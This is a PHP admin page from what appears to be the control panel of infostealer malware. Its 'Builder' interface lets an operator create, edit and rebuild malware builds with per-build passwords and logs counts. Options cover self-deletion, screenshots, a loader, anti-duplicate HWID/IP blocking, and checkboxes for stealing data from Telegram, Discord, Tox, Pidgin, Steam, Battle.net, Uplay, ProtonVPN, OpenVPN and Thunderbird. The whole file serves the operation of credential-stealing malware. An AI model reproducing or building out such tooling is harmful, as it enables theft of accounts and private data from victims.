<?php

include "../config.php";
include_once "app/functions.php";
include_once "app/managers/AccountManager.php";

session_start();

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$page_name = "Builder";

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    header("Location: dashboard");
    exit();
}

include_once 'app/pages/header.php';

?>
<div class="body-wrapper">
    <div class="container-fluid">
        
        <div class="card card-body py-3">
            <div class="row align-items-center">
                <div class="col-12">
                    <div class="d-sm-flex align-items-center justify-space-between">
                        <h4 class="mb-4 mb-sm-0 card-title">Builds</h4>
                        <nav aria-label="breadcrumb" class="ms-auto">
                        <a href="javascript:void(0)" id="btn-add-contact" class="btn btn-xs btn-danger align-items-center" onclick="RebuildAll();">Rebuild All</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                            <a href="javascript:void(0)" id="btn-add-contact" class="btn btn-xs btn-primary align-items-center" onclick="createBuildModal();">Create Build</a>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
        
        <style>
        #users_table td {white-space: normal;word-wrap: break-word;}
        </style>

        <table id="builds_table" class="table text-nowrap customize-table mb-0 align-middle" >
            <thead class="text-dark fs-4">
                <tr>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">ID</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Name</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Version</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Password</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Last Compile</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Logs Count</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Status</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Actions</h6>
                    </th>
                </tr>
            </thead>
            <tbody>

            </tbody>
        </table>
    </div>
</div>
</div>

<!-- Modal Create Build -->
<div class="modal fade" id="create_build_modal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-2">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
        <div class="modal-content">
            <div class="modal-header d-flex align-items-center">
                <h4 class="modal-title" id="modal_create_rule_header">Create Build</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            
            <div class="modal-body">
                <div>
                    <div>
                    
                        <div class="form-body">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <label class="form-label">Build Name</label>
                                        <input type="text" class="form-control" placeholder="default" id="create_build_name" maxlength="25">
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">General</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_self_delete">
                                        <label class="form-check-label" for="create_self_delete">Build Self-Delete</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_take_screenshot" checked="">
                                        <label class="form-check-label" for="create_take_screenshot">Take Screenshot</label>
                                    </div>
                                </div>
                                
                            </div>

                            <div class="row">
                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_block_hwid">
                                        <label class="form-check-label" for="create_block_hwid">Block HWID duplicates</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_block_ips" >
                                        <label class="form-check-label" for="create_block_ips">Block IP duplicates (1 day)</label>
                                    </div>
                                </div>

                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Loader</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_loader_before_grabber">
                                        <label class="form-check-label" for="create_loader_before_grabber">Loader before Grabber</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Messengers</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_telegram" checked>
                                        <label class="form-check-label" for="create_steal_telegram">Telegram</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_discord" checked>
                                        <label class="form-check-label" for="create_steal_discord">Discord</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_tox" checked>
                                        <label class="form-check-label" for="create_steal_tox">Tox Chat</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_pidgin" checked>
                                        <label class="form-check-label" for="create_steal_pidgin">Pidgin</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Gaming</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_steam" checked>
                                        <label class="form-check-label" for="create_steal_steam">Steam</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_battlenet" checked>
                                        <label class="form-check-label" for="create_steal_battlenet">Battle.Net</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_uplay" checked>
                                        <label class="form-check-label" for="create_steal_uplay">Uplay</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">VPN</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_protonvpn" checked>
                                        <label class="form-check-label" for="create_steal_protonvpn">ProtonVPN</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_openvpn" checked>
                                        <label class="form-check-label" for="create_steal_openvpn">OpenVPN</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Email Clients</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline" style="display: none;">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_outlook">
                                        <label class="form-check-label" for="create_steal_outlook">Outlook</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="create_steal_thunderbird" checked>
                                        <label class="form-check-label" for="create_steal_thunderbird">Thunderbird</label>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <a id="modal_create_button" href="#" class="btn btn-primary" >Create</a>
                    <button type="button" class="btn bg-danger-subtle text-danger  waves-effect text-start" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>        
</div>

<!-- Modal Edit Build -->
<div class="modal fade" id="edit_build_modal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-2">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
        <div class="modal-content">
            <div class="modal-header d-flex align-items-center">
                <h4 class="modal-title" id="modal_edit_build_header">Edit Build ?</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            
            <div class="modal-body">
                <div>
                    <div>
                    
                        <div class="form-body">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <label class="form-label">Build Name</label>
                                        <input type="text" class="form-control" placeholder="" id="edit_build_name" disabled>
                                        <input type="text" class="form-control" placeholder="" id="edit_build_id" style="display: none;">
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">General</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_self_delete">
                                        <label class="form-check-label" for="edit_self_delete">Build Self-Delete</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_take_screenshot">
                                        <label class="form-check-label" for="edit_take_screenshot">Take Screenshot</label>
                                    </div>
                                </div>
                                
                            </div>

                            <div class="row">
                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_block_hwid">
                                        <label class="form-check-label" for="edit_block_hwid">Block HWID duplicates</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_block_ips" >
                                        <label class="form-check-label" for="edit_block_ips">Block IP duplicates (1 day)</label>
                                    </div>
                                </div>

                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Loader</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_loader_before_grabber">
                                        <label class="form-check-label" for="edit_loader_before_grabber">Loader before Grabber</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Messengers</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_telegram">
                                        <label class="form-check-label" for="edit_steal_telegram">Telegram</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_discord">
                                        <label class="form-check-label" for="edit_steal_discord">Discord</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_tox">
                                        <label class="form-check-label" for="edit_steal_tox">Tox Chat</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_pidgin">
                                        <label class="form-check-label" for="edit_steal_pidgin">Pidgin</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Gaming</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_steam">
                                        <label class="form-check-label" for="edit_steal_steam">Steam</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_battlenet">
                                        <label class="form-check-label" for="edit_steal_battlenet">Battle.Net</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_uplay">
                                        <label class="form-check-label" for="edit_steal_uplay">Uplay</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">VPN</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_protonvpn">
                                        <label class="form-check-label" for="edit_steal_protonvpn">ProtonVPN</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_openvpn">
                                        <label class="form-check-label" for="edit_steal_openvpn">OpenVPN</label>
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="d-flex mb-3 align-items-center">
                                    <h4 class="card-title mb-0">Email Clients</h4>
                                </div>

                                <div class="col-md-8 col-xl-9">
                                    <div class="form-check form-check-inline" style="display: none;">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_outlook">
                                        <label class="form-check-label" for="edit_steal_outlook">Outlook</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input primary" type="checkbox" id="edit_steal_thunderbird">
                                        <label class="form-check-label" for="edit_steal_thunderbird">Thunderbird</label>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <a id="modal_edit_button" href="#" class="btn btn-primary" >Save</a>
                    <button type="button" class="btn bg-danger-subtle text-danger  waves-effect text-start" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>        
</div>

<div class="modal fade" id="modal_rebuild_all" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-2">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
        <div class="modal-content">
            <div class="modal-header modal-colored-header bg-danger text-white">
                <h4 class="modal-title text-white" id="danger-header-modalLabel">Rebuild All Builds</h4>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <h5 class="mt-0">Warning!</h5>
                <p>Do you want to rebuild all builds?</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-light" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn bg-danger-subtle text-danger " onclick="RebuildAllProcess()" >Rebuild</button>
            </div>
        </div>
    </div>
</div>

<div class="dark-transparent sidebartoggler"></div>

<script>var server_time = "<?php echo (new DateTime())->format('Y-m-d H:i:s'); ?>";</script>

<?php include_once 'app/pages/footer.php'; ?>

<script src="assets/js/builder.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function() 
{
    const input = document.getElementById('create_build_name');

    input.addEventListener('input', function() 
    {
        this.value = this.value.replace(/[^A-Za-z0-9]/g, '');
    });
});
</script>
</body>
</html>